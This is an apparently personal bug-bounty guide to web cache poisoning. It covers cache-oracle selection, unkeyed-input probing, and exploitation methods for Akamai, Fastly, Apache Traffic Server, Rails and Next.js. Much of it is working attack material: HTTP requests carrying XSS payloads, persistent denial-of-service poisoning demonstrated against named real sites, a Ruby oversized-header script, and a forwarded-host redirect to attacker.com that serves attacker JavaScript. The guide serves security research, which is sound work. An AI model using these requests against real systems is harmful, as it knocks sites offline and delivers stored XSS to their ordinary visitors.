---
title: How to poison caching servers
date: 2024-02-12 12:00:00 -500
categories: [bugbounty, hacking]
tags: [bugbounty,hacking,cachepoisoning]
---

----
#### Cache Poisoning Methodology:
----
##### 1. Select Cache Oracle:
The implementation and configuration quirks that we're interested in exploiting vary from site to site, so it's crucial to start by building an understanding of how the target cache works. To achieve this, we'll need to pick an endpoint on the target site, which I'll refer to as the cache oracle. This endpoint must be cacheable, and there must be some way to tell if you got a cache hit or miss. This could be an explicit HTTP header like CF-Cache-Status: HIT, or could be inferred through dynamic content or response timing.

Ideally, the cache oracle should also reflect the entire URL and at least one query parameter. This will help us find discrepancies between the cache's parameter parsing and the application's - more on that later.

If you're really lucky, and you ask the oracle nicely, it will tell you the cache key. Or at least give you three conflicting cache keys, each with an element of truth:
```http
GET /?param=1 HTTP/1.1  
Host: example.com  
Origin: zxcv  
Pragma: akamai-x-get-cache-key, akamai-x-get-true-cache-key  
  
HTTP/1.1 200 OK  
X-Cache-Key: /example.com/index.loggedout.html?akamai-transform=9 cid=__Origin=zxcv  
X-Cache-Key-Extended-Internal-Use-Only: /example.com/index.loggedout.html?akamai-transform=9 vcd=1234 cid=__Origin=zxcv  
X-True-Cache-Key: /example.com/index.loggedout.html vcd=1234 cid=__Origin=zxcv
```

##### 2. Detect Unkeyed Input/ Probe Key Handling (Unkeyed Headers, Parameters, Query Strings, Ports/ Transformations, Normalizations,  Escaping, Parsing, Discrepancies):
After selecting our cache oracle, the next step is to ask it a series of questions to identify whether our request is transformed in any way when it's saved in the cache key. Common exploitable transformations include removing specific query parameters, removing the entire query string, removing the port from the Host header, and URL-decoding.

Each question is asked by issuing two slightly different requests and observing whether the second one causes a cache hit, indicating that it was issued with the same cache key as the first.

Here's a simple example adapted from a real website. For our cache oracle, we'll use the target's homepage because it's reflecting the Host header and has a response header that tells us whether we got a cache hit or not:
```http
GET / HTTP/1.1  
Host: redacted.com  
  
HTTP/1.1 301 Moved Permanently  
Location: https://redacted.com/en  
CF-Cache-Status: MISS
```

First, we add our value:
```http
GET / HTTP/1.1  
Host: redacted.com:1337  
  
HTTP/1.1 301 Moved Permanently  
Location: https://redacted.com:1337/en  
CF-Cache-Status: MISS
```

Then we remove the port, replay the request, and see if we get a cache hit:
```http
GET / HTTP/1.1  
Host: redacted.com  
  
HTTP/1.1 301 Moved Permanently  
Location: https://redacted.com:1337/en  
CF-Cache-Status: HIT
```
Looks like we did. In addition to confirming that this site doesn't include the port in the cache key, we've also just persistently taken down their homepage - anyone who attempts to access this will get a redirect to a dud port, causing a timeout.

##### 3. Exploit (Vulnerabilities/ Gadgets):
The final step to mature our cache-key transformation into a healthy high-impact exploit is to find a gadget on the target website to chain our transformation with. Gadgets are reflected, client-side behaviors like XSS, open redirects, and others that have no classification because they're usually harmless. Cache poisoning can be combined with gadgets in three main ways:

- Increasing the severity of reflected vulnerabilities like XSS by making them 'stored', exploiting everyone who browses to a poisoned page.  
- Enabling exploitation of dynamic content in resource files, like JS and CSS.  
- Enabling exploitation of 'unexploitable' vulnerabilities that rely on malformed requests that browsers won't send.

Each of these three cases may lead to full site takeover. Crucially, the latter two behaviors are often left unpatched as they're perceived as being unexploitable.


----
#### Cache Poisoning Checklist:
----
##### Selecting Cache Oracle:
- **Find Cache Oracle endpoint**: This endpoint must be cacheable, and there must be some way to tell if you got a cache hit or miss. This could be an explicit HTTP header like `CF-Cache-Status: HIT`, or could be inferred through dynamic content or response timing. Some response headers to look for:
	- ==**X-Cache/ CF-Cache-Status**==: indicate whether the response was served from the cache or not. Values can include `HIT`, `MISS`, `BYPASS`, or `EXPIRED`.
		- **Common Values**:
			- **`HIT`**: The response was served from the cache.
			- **`MISS`**: The response was not served from the cache and was fetched from the origin server.
			- **`BYPASS`**: Caching was intentionally bypassed.
			- **`REVALIDATED`**: The cache was revalidated before serving the response.
	- **==Cache-Control==**: The **`Cache-Control`** header specifies caching behavior and directives for requests and responses, helping define how long responses can be cached, whether they are cacheable, and under what conditions they should be validated or re-fetched.
		- **Common Directives**:
			- **`no-cache`**: Forces revalidation with the origin server before serving a cached response.
			- **`no-store`**: Prevents the storage of the response in any cache.
			- **`max-age=<seconds>`**: Specifies the maximum time (in seconds) that the resource is considered fresh.
			- **`must-revalidate`**: Once a cached response becomes stale, it must be revalidated with the origin server before being served again.
	- **==Age==**: The **`Age`** header specifies the time (in seconds) since the resource was fetched from the origin server and placed in the cache. Essentially, it represents how "old" the cached response is. **Example**: 
		- If `Age: 3600` is returned, it means the response has been cached for one hour.
	- **==max-age==**: **`max-age`** is a directive used within the **`Cache-Control`** header. It indicates the maximum amount of time, in seconds, that a resource is considered "fresh." Once this time has elapsed, the cache will treat the resource as stale and may revalidate it with the origin server. **Example**: 
		- `Cache-Control: max-age=600` means the response can be cached for 600 seconds (10 minutes) before revalidation is needed. Combining **`Age`** and **`max-age`** helps assess when content is likely to be re-fetched, making timing attacks feasible in specific scenarios (e.g., cache poisoning attacks).
	- **==Vary==**: The **`Vary`** header tells caches (including browsers and intermediary caches like CDNs) to consider additional request headers when determining if a cached response is valid for a subsequent request. I specify that there are sometimes additional headers forming part of the cache key not being specified in **`Vary`**, the list is therefore not systematically exhaustive. **Example**: 
		- `Vary: User-Agent` means that different cached versions should be served based on the `User-Agent` header.
		- `Vary: Accept-Encoding` means different cached versions are stored based on whether the request specifies `gzip`, `deflate`, etc.
	- **==Expires==**: Specifies a date and time after which the response is considered stale.
	- **==Pragma==**: Used for backward compatibility with HTTP/1.0 caches (e.g., `Pragma: no-cache`).
	- **Tips & Tricks**: 
		- For the attack to be interesting, the DOS must be — in the best case — **on the main homepage**, the link to certain resources like a CSS or a font file does not have much impact.
		- It is sometimes necessary to resend the “poisoned” request several times so that it is stored in the cache. As you may have noticed from the answer above, no cache information appears. It is therefore through trial and error that it will be necessary to go through to understand the operation of the cache to be exploited.
		- It may be useful to perform a test via another IP address (from the same location) to ensure that the cache poisoning is effective.
		- It is often necessary **to adjust the headers of its request so that they correspond to the cache keys of the target**: most often it is the `User-Agent`, `Accept-Encoding` or `Accept-Language`. Otherwise, you will be unable to retrieve the poisoned response — from the cache on another browser -> `X-Cache` (or similar header) will always return `MISS`.
		- If you find an unusable “unkeyed” header — in terms of XSS/HTMLi etc. — **consider DOS as a last resort** : If you manage to cause an error in the back-end and cache the response then you have your vulnerability (provided of course that the DOS is done on an interesting page and not a CSS or other resource).
##### Input Exploitation:
- **Path Exploitation**:
	- **Exploiting mapping discrepancies** 
		- When the URL is normalized before generating the cache key:
			When the origin server uses a special mapping or doesn't normalize the path before generating the response, it's possible to control the key used for stored resources. An classic example of this are applications that have a self-reflected XSS when an non-existing endpoint is visited.
			
			Consider the following request/response:
			```
			GET /<script>X</script> HTTP/1.1 
			Host: server.com
			

			HTTP/1.1 404 Not Found 
			Content-Type: text/html 
			Cache-Control: public 
			
			Not Found /<script>X</script>
			```
			The malicious payload is part of the URL and is reflected in a cacheable response. However, a valid user would never issue a request to `/<script>X</script>` if there is no interaction with the attacker. Therefore, even if the response is also accessible through the encoded version `/%3Cscript%3EX%3C/script%3E` (the key is decoded), the attacker will need to send a link to the victim, just as in a reflected XSS scenario.
			
			However, if the key is normalized, the following payload would poison a highly visited endpoint like `/home` with the malicious response:
			```
			GET /<Backend_Path><Path_Traversal><Poisoned_Path>
			```
			![[Pasted image 20241019174130.png]]
			The double dot-segment is used in this example as the payload already contains a slash. Adjust the path traversal to resolve to the desired poisoned endpoint. The same technique can be applied if a special mapping is used for the `backend_path` placeholder.
		- Similarly, the above method can also be used to DoS innocent pages by tricking the cache server into caching `404 Not Found` response on genuine pages. For ex:
			```
			GET /resources/aaa/../images/blog.svg HTTP/2
			Host: redacted.com
			

			HTTP/2 404 Not Found
			Cache-Control: max-age=30
			Age: 3
			X-Cache: hit
			
			"Not Found"
			```
			In the above request and response, the cache server normalizes the path from `/resources/aaa/../images/blog.svg` to `/resources/images/blog.svg` (cache key) but the origin server doesn't normalize the path so it returns `404 Not Found` which get cached for the request key `/resources/images/blog.svg`. So any user who visits the original path will get a `404 Not Found` instead of the actual resource.
		- If any part of the path is normalized or excluded from cache key that can alter the response, it can be used to create DoS. For Example:
			![[Pasted image 20241019212914.png]]
			Yet again, while trying to increase the cache-hit ratio, developers did not take in consideration potential DoS attacks, which allowed me to inject `%2e%2e`(URL encoded `..`) and redirect requests to `/map/4/77/16.png`, which did not exist on the server, therefore leading to the 404.
	- **Exploiting back-end delimiters**: 
		- When a character is used as a delimiter by the origin server but not by the cache, it's possible to generate an arbitrary key for the cacheable resource. The delimiter will stop the backend from resolving the dot-segment.
			```
			GET /<Backend_Path><Delimiter><Path_Traversal><Poisoned_Path>
			```
			![[Pasted image 20241019175049.png]]
	- **Exploiting front-end delimiters**: 
		- In [web cache deception](https://portswigger.net/web-security/web-cache-deception) attacks, the parsing discrepancy was caused by a delimiter being used only in the origin server but not in the cache. Finding a character with special meaning for the cache server that can be sent through a browser is rare. However, as web cache poisoning doesn't require user interaction, delimiters like the hash can create path confusion. This is useful because fragments are interpreted differently by many HTTP servers, CDNs, and backend frameworks, as shown in the tables below:
			![[Pasted image 20241019185124.png]]
			Therefore, in cases like Microsoft Azure, which normalizes the path and treats the hash as a delimiter, it's possible to use this to modify the cache key of the stored resource:
			```
			GET /<Poisoned_Path><Front-End_Delimiter><Path_Traversal><Backend_Path>
			```
			This technique could be applied to any delimiter used by the cache. The only requirement is that the key is normalized and the path is forwarded with the suffix after the delimiter.
- **Query Exploitation**:
	-  **Check if the query is excluded from the cache key**:
		- Put cache busters in any headers that can be safely edited without significant side-effects, and might be included in the cache key.
			```
			GET /?q=canary&cachebust=nwf4ws HTTP/1.1  
			Host: example.com  
			Accept-Encoding: gzip, deflate, nwf4ws  
			Accept: */*, text/nwf4ws  
			Cookie: nwf4ws=1  
			Origin: https://nwf4ws.example.com
			```
		- Sites running **Cloudflare** include the `Origin header` in the cache key by default.
		- Enable cache busters for all **Burp Suite** traffic by selecting `'Add static cachebuster'` and `'Include cachebusters in headers'` via Param miner.
		- Delete entries from the target's cache, without authentication, by using the HTTP methods `PURGE` and `FASTLYPURGE` to increase attack complexity.
		- **Take advantage of path normalization**:
			Here's four different approaches to hitting the path '/' on different systems:
			```
			Apache: //  
			Nginx: /%2F  
			PHP: /index.php/xyz  
			.NET: /(A(xyz))/
			```
	-  **When the query string is excluded from the cache key**:
		- **==Basic injection==**: Check if the unkeyed query is vulnerable to basic injection:
			```
			GET //?"><script>alert(1)</script> HTTP/1.1  
			Host: redacted-newspaper.net  
		  
			HTTP/1.1 200 OK  
			<meta property="og:url" content="//redacted-newspaper.net//?x"><script>alert(1)</script>"/>
			```
		- **==Redirect DoS==**: Find a cacheable redirect that reflect the unkeyed query string:
			```
			GET /login?x=very-long-string... HTTP/1.1  
			Host: www.cloudflare.com  
			Origin: https://dontpoisoneveryone/
			```
			
			Then when someone else tries to visit the login page, they'll naturally get a redirect with a long query string:
			```
			GET /login HTTP/1.1  
			Host: www.cloudflare.com  
			Origin: https://dontpoisoneveryone/  
  
			HTTP/1.1 301 Moved Permanently  
			Location: /login/?x=<very-long-string>
			```
			
			When their browser follows this, the extra forward slash makes the URI one byte longer, resulting in it being blocked by the server:
			```
			GET /login**/**?x=<very-long-string> HTTP/1.1  
			Host: www.cloudflare.com  
			Origin: https://dontpoisoneveryone/  

			HTTP/1.1 414 Request-URI Too Large  
			CF-Cache-Status: MISS
			```
			
			So with one request, we can persistently take down this route to Cloudflare's login page. This is all thanks to the redirect; we can't do this attack by sending the overlong URI ourselves because Cloudflare refuses to cache any response with an error status code like **414** (but not all CDNs). The redirect adds a layer of indirection that makes this attack possible. In the same way, even though the login page at dash.cloudflare.com/login isn't cacheable, we could still use cache poisoning to add malicious parameters to it via the redirect.

			In general, if you find a cacheable redirect that is actively used and reflects query parameters, you can inject parameters on the redirect destination, even if the destination page isn't cacheable or on the same domain.
		- **==414 Request-URI Too Long==**: If any "specific" query is excluded from the cache key while **414** response is cached, then it leads to **CP-DoS**. 
			For Example:
			```
			GET /assets/anything?excludedQuery=<very-long-string> HTTP/2
			Host: redacted.com

			HTTP/2 414 Request-URI Too Long
			X-Cache: MISS
			```
			
			```
			GET /assets/anything HTTP/2
			Host: redacted.com

			HTTP/2 414 Request-URI Too Long
			X-Cache: HIT
			```
- **Header Exploitation**:
	- **==x-http-method-override==**: allows the HTTP method to be overridden. Appending the header `x-http-method-override: POST`, would return a 405 status code which Fastly does not cache by default. It was however possible to send the header `x-http-method-override: HEAD` and poison the cache into returning an empty response body.
	- **==x-forwarded-scheme==**: results into a 301 redirect to the same location. If the response was cached by a CDN, it would cause a redirect loop, inherently denying access to the file.
	- **==x-forwarded-host==**: is a de-facto standard header for identifying the original host requested by the client in the [`Host`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Host) HTTP request header. It can be used to redirect the host into attacker controlled domain or is sometimes reflected in the response while creating URLs.
	- **==x-forwarded-for==**: a common method for identifying the originating IP address of a client connecting to a web server through an HTTP proxy or load balancer.
	- **==x-forwarded-port==**: allows to redirect users to a different port.
	- **==x-original-url==**/ **==x-rewrite-url==**: allows overriding the target URL in requests with the one specified in the header value.
	- **==x-middleware-prefetch==**: **CVE-2023-46298** - results in an empty JSON object `{}` as a response. If a CDN or caching system is present, this empty response can potentially be cached —depending on the cache rules configuration— rendering the targeted page **impractical and its content inaccessible**.
	- **==x-invoke-status==**: overwrites the value of the `statusCode` property of the response object. Then the `/_error` page is returned (_whatever the HTTP code specified_)
	- **==x_forwarded_host==**: although uncommon -because dropped by default on some servers- the use of underscores in headers complies with RFC standards and sometimes allows the protections put in place to be completely bypassed.
	- **==x-forwarded-SSL==**: overwrite certain pages with a response saying 'Contradictory scheme headers'.
	- **==Transfer-Encoding==**: to overwrite arbitrary pages.
- **Method Exploitation**:
	- **==Fat GET==**: Check for websites that uses `GET` request with bodies referred to as **fat GET** request, and check if the you can alter the response with it. In simple words: If the application lets users pass parameters in the body of `GET` requests, but does not include them in the cache key and if you can alter the response with the unkeyed body in any manner then you have a **fat GET CP** issue.
		```
		GET /js/geolocate.js?callback=setCountryCookie HTTP/2
		Host: redacted.com

		callback=alert(1)
		```
	- **==POST request CP==**: Another way to hide parameters from the cache key is simply to send a POST request; certain peculiar systems don't bother including the request method in the cache key:
		```
		POST /view/o2o/shop HTTP/1.1  
		Host: alijk.m.taobao.com  
		  
		_wvUserWkWebView=a</script><svg onload='alert%26lpar;1%26rpar;'/data-  
  
		HTTP/1.1 200 OK  
		…  
		"_wvUseWKWebView":"a</script><svg onload='alert&lpar;1&rpar;'/data-"},
		```
		```
		GET /view/o2o/shop HTTP/1.1  
		Host: alijk.m.taobao.com  
  
		HTTP/1.1 200 OK  
		…  
		"_wvUseWKWebView":"a</script><svg onload='alert&lpar;1&rpar;'/data-"},
		```
		
		Aaron Costello independently discovered this technique around the same time as me - I recommend checking out [his writeup](https://enumerated.wordpress.com/2020/08/05/the-case-of-the-missing-cache-keys/) on the topic for more examples.
- **User Agent Rules Exploitation**:
	- Due to the high amount of traffic tools like **FFUF** or **Nuclei** generate, some developers decided to block requests matching their user-agents. Ironically, these tweaks can introduce unwanted cache poisoning DoS opportunities if the `403 Forbidden` page is cacheable.
		```
		GET /index.html HTTP/1.1
		Host: redacted.com
		User-Agent: FFUF

		HTTP/1.1 403 Forbidden
		X-Check-Cacheable: YES
		```
	- `User-Agent` using the venerable ==Internet Explorer 9== can trigger the cached page with a 'Please update your browser' response.
- **Cookie Header Values Exploitation**: 
	- **==Unkeyed Lang Pref==**: If a cookie indicates the user's preferred language, which is then used to load the corresponding version of the page, if it is unkeyed then it can be used to poison the cache that serve the pages in different language. For example:
		```
		GET /blog/post.php?cb=1 HTTP/1.1 
		Host: innocent-website.com 
		Cookie: language=pl; 
		```
	- **==Unkeyed Input Reflection==**: If any value from the cookie is reflected in the response, it can be used to inject malicious payload like XSS, HTMLi etc. For example:
		```
		GET /?cb=1 HTTP/1.1 
		Host: innocent-website.com 
		Cookie: unkeyedReflected=nischal"></script><svg/onload=alert(1)>; 
		```
- **Cache Key Normalization Exploitation**:
	- **==Host Header Case Normalization==**: According to [RFC 4343](https://tools.ietf.org/html/rfc4343), FQDN (Fully qualified domain names) should always be case insensitive, however, for some reason, this is not always respected by frameworks. Interestingly enough, since the host value should be case insensitive, some developers assume it's safe to lowercase the host header value when introducing it into the cache key, without altering the actual request sent to the backend server.
		When pairing the two behaviors, I was able to achieve the following DoS attack on a host using a customly configured Varnish as a caching solution.
		![[Pasted image 20241019211846.png]]
		Notice the capitalized host header value, causing a 404 error, which will then be cached by Varnish using the normalized value of the host header in the cache key.
	- **==Host Header Port Normalization==**: If the caching server removes the port from the host header before generating the cache key, but sends the actual host header with port to the origin server, it can be used to DoS the homepage.
		For example:
		```
		GET / HTTP/1.1  
		Host: redacted.com:1337  
		  
		HTTP/1.1 301 Moved Permanently  
		Location: https://redacted.com:1337/en  
		CF-Cache-Status: MISS
		```
		Then we remove the port, replay the request, and see if we get a cache hit:
		```
		GET / HTTP/1.1  
		Host: redacted.com  
		  
		HTTP/1.1 301 Moved Permanently  
		Location: https://redacted.com:1337/en  
		CF-Cache-Status: HIT
		```
		Looks like we did. In addition to confirming that this site doesn't include the port in the cache key, we've also just persistently taken down their homepage - anyone who attempts to access this will get a redirect to a dud port, causing a timeout.
	- **==Path Normalization==**: If any part of the path or query string is normalized or excluded from cache key that can alter the response, it can be used to create DoS. For Example:
		![[Pasted image 20241019212914.png]]
		Yet again, while trying to increase the cache-hit ratio, developers did not take in consideration potential DoS attacks, which allowed me to inject `%2e%2e`(URL encoded `..`) and redirect requests to `/map/4/77/16.png`, which did not exist on the server, therefore leading to the 404.
	- **==Query Normalization==**: If any specific query is normalized or excluded from the cache key, try to alter the response with it. 
		For Example: 
		```
		GET /assets/anything?excludedQuery=<very-long-string> HTTP/2
		Host: redacted.com

		HTTP/2 414 Request-URI Too Long
		X-Cache: MISS
		```

		```
		GET /assets/anything HTTP/2
		Host: redacted.com

		HTTP/2 414 Request-URI Too Long
		X-Cache: HIT
		```
- **CP-Dos**: 
	- **==HTTP Header Oversize (HHO)==**: HHO CPDoS attacks work in scenarios where a web application uses a cache that accepts a larger header size limit than the origin server. To attack such a web application, a malicious client sends a `HTTP GET` request including a header larger than the size supported by the origin server but smaller than the size supported by the cache. To do so, an attacker has two options. First, she crafts a request header with many malicious headers as shown in the following Ruby code snippet. The other option is to include one single header with an oversized key or value.
		```ruby
		require 'net/http'
		uri = URI("https://example.org/index.html")
		req = Net::HTTP::Get.new(uri)
		
		num = 200
		i = 0
		
		# Setting malicious and irrelevant headers fields for creating an oversized header
		until i > num  do
			req["X-Oversized-Header-#{i}"] = "Big-Value-0000000000000000000000000000000000"
			i +=1;
		end
		
		res = Net::HTTP.start(uri.hostname, uri.port, :use_ssl => uri.scheme == 'https') {|http|
			http.request(req)
		}
		```
		The cache forwards this request including all headers to the endpoint since the header size remains below the size limit of 20,480 bytes. The web server, however, blocks this request and returns an error page, as the request header exceeds its header size limit. This error page with status code `400 Bad Request` is now stored by the cache. All subsequent requests targeting the denied resource are now provided with an error page instead of the genuine content.
	- **==HTTP Meta Character (HMC)==**: This attack tries to bypass a cache with a request header containing a harmful meta character or invalid HTTP formation to trigger `400 Bad Request`, if cached then leads to DoS. Meta characters can be, e.g., control characters such as line break/carriage return (`\n`), line feed (`\r`) or bell (`\a`). For example; on **Akamai CDN**, the following character backward slash `\` causes `400 Bad request`, if cached then it leads to DoS:
		```
		GET /xx/xx/xx/xx?test HTTP/1.1  
		Host: redacted.com  
		\: 

		HTTP 404 Bad request
		X-Cache: MISS
		```
		An unaware cache forwards such a request to the origin server without blocking the message or sanitizing the meta characters. The origin server, however, may classify such a request as malicious as it contains harmful meta characters. As a consequence, the origin server returns an error message which is stored and reused by the cache.
	- **==HTTP Request Override Attack (HRO)==**: Any unkeyed request header that changes the request destination or method can lead to CP-DoS. Headers like: `X-HTTP-Method-Override`, `X-HTTP-Method` or `X-Method-Override` can make origin server change the request method to any arbitrary method other than the one request, if that is cached by the proxy server then it can be used as a DoS. Also headers like: `x-original-url`/ `x-rewrite-url` can be used to overwrite the path of the endpoint which can be used to redirect users to arbitrary page. 
##### CDNs/ Frameworks/ CVEs:
- **Akamai CDN**:
	- **==Illegal Request Header==**: Add an Illegal Request Header into the request and check if the response is cached (Cache Poisoning via Illegal Request Header allows DoS):
		```
		GET /xx/xx/xx/xx?test HTTP/1.1  
		Host: redacted.com  
		\: 
		```
		- **Tip**: `Akamai has a workaround for this exploit, by making the 400 response to only last 5 seconds in the cache, however, an attacker can send null payloads using intruder in burp, so that the same 400 response gets cached forever.`
	- **==WCD==**: When authenticated, check if any sensitive information is disclosed in any page (like Session Token, CSRF tokens, etc). Add a Cacheable Extension (`.js` , `.css`) at the end of the URL and see if it gives a `200 OK` Response (Cache Deception).
		```
		GET /profile/me/.js?cacheThis HTTP/1.1  
		Host: redacted.com  
		Cookie: blah blah blah
		```
		Sometimes, if the response is a “`404 Not found`” Akamai only caches the response for less than 10 seconds, making this harder for the attacker. The attacker needs to be quick in this case, however, if Akamai Detects a `200 Ok` Response, the response will last for at least 24 Hours.
		- **Tip**: `In some applications, if you add a Semicolon (;) before the extension it may give you a 200 Ok response.`
- **Cloudflare CDN**:
	- 
- **Apache Traffic Server CDN**:
	- ([CVE-2021-27577](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27577)) - When a request sent to ATS contains a url fragment, ATS forwards it without stripping the fragment. According to [RFC7230](https://datatracker.ietf.org/doc/html/rfc7230), the requests forwarded by ATS are invalid, since the origin-form should only be composed of the absolute-path and query. Moreover, ATS generates cache keys by extracting the host, path and query, ignoring the URL fragment. This therefore means that both requests below will share the same cache key:
		```
		GET /index.html HTTP/1.1
		Host: redacted.com 

		GET /index.html#Fragment HTTP/1.1
		Host: redacted.com
		```
		ATS ignoring the URL fragment when generating the cache key, but still forwarding it creates a huge opportunity for cache poisoning attacks. When the proxies behind ATS are configured to encode `#` to `%23`, it makes it possible for an attacker to cache a completely different path under any cache key. If the backend also normalized `/../`, it would allow an attacker to redirect users to any path, allowing for easy escalation for XSS and Open redirects.
		![[Pasted image 20240930173845.png]]
- **Fastly CDN**:
	- **==Google Cloud Buckets==** support the use of the `x-http-method-override` header by default, which allows the HTTP method to be overridden. Appending the header `x-http-method-override: POST`, would return a 405 status code which Fastly does not cache by default. It was however possible to send the header `x-http-method-override: HEAD` and poison the cache into returning an empty response body.
		```
		GET /index.html HTTP/1.1
		Host: redacted.com
		http-method-override: HEAD
		```
	- Fastly (Varnish), does not do any URL normalization before generating the cache key, so it is possible to URL encode any keyed parameter that can cause `400 Bad Request` which is ignored by the cache but used by the backend. 
		```
		GET /images/logo.png?size=32x32&siz%65=0 HTTP/1.1
		Host: img.redacted.com
		
		HTTP/1.1 400 Bad Request
		X-Cache: MISS

		GET /images/logo.png?size=32x32 HTTP/1.1
		Host: img.redacted.com
		
		HTTP/1.1 400 Bad Request
		X-Cache: MISS
		```
		URL encoding the second `size` parameter caused it to be ignored by the cache, but used by the backend. Giving the parameter a value of 0 would result in a cacheable `400 Bad Request` as the backend was using the second value instead of first one.
- **Ruby on Rails (Framework)**:
	- **==Custom Delimiter==**: Ruby on Rails framework treats ';' as a parameter-delimiter, just like '&'. This means that the following URLs are equivalent:
		```ruby
		/?param1=test&param2=foo  
		/?param1=test;param2=foo
		```
		This parsing quirk has numerous security implications, and one of them is highly relevant. On a system configured to exclude `utm_content` from the cache key, the following two requests are identical as they only have one keyed parameter - callback.
		```
		GET /jsonp?callback=legit&utm_content=x;callback=alert(1)// HTTP/1.1  
		Host: example.com  

		HTTP/1.1 200 OK  
		alert(1)//(some-data)
		```
		```
		GET /jsonp?callback=legit HTTP/1.1  
		Host: example.com  

		HTTP/1.1 200 OK  
		X-Cache: HIT  
		alert(1)//(some-data)
		```
		However, Rails sees three parameters - callback, utm_content, and callback. It prioritizes the second callback value, giving us full control over it.
	- **==Rack middleware==**: Ruby on Rails applications are often deployed alongside the **Rack middleware**. The Rack code below takes the value of the `x-forwarded-scheme` value and uses it as the scheme of the request. 
		![[Pasted image 20240930175507.png]]
		So sending the `x-forwarded-scheme: http` header would result into a `301 redirect` to the same location. If the response was cached by a CDN, it would cause a redirect loop, inherently denying access to the file.
		```
		GET /?xxx HTTP/2  
		Host: Redacted  
		X-Forwarded-Scheme: http  
		...
		
		HTTP/2 301 Moved Permanently  
		Date: Wed, 19 Jan 2022 17:16:13 GMT  
		Content-Type: text/html  
		Location: Redacted  
		Via: 1.1 vegur  
		Cf-Cache-Status: HIT  
		Age: 3
		```
		If the server also trusted the `X-forwarded-host` header on 301 redirects via `X-Forwarded-Scheme: https`, it allows an attacker to redirect JS files to attacker controlled JavaScript leading to stored XSS.
		```
		GET /static/main.js HTTP/1.1
		Host: redacted.com
		X-Forwarded-Scheme: https
		X-forwarded-host: attacker.com

		HTTP/1.1 301 Moved Permanently
		Location: https://attacker.com/static/main.js
		X-Cache: Hit From Cloudfront
		```
- **Next.js (Framework)**: 
	- **==CVE-2023-46298==**:  **x-middleware-prefetch** header in `Next.js` applications results in an empty JSON object `{}` as a response. If a CDN or caching system is present, this empty response can potentially be cached —depending on the cache rules configuration— rendering the targeted page **impractical and its content inaccessible**.
	- **==Rsc: 1==**: by sending a request with the `Rsc` header without using a cache-buster that is automatically added by `Next.js` framework to "prevent" cache poisoning, we can poison the cache but - whether this attack succeeds naturally depends on **the CDN and its cache-rules** to follow vary header.
	- **==x-invoke-status==**: overwrites the value of the `statusCode` property of the response object. Then the `/_error` page is returned (_whatever the HTTP code specified_). It is therefore possible to specify any HTTP code to **alter the response code and return the error page** (`/_error`). Generally, CDNs and caching systems are configured not to cache HTTP error codes. However, an attacker can specify the code `200` to align with cache rules and effectively “force” the caching of the error page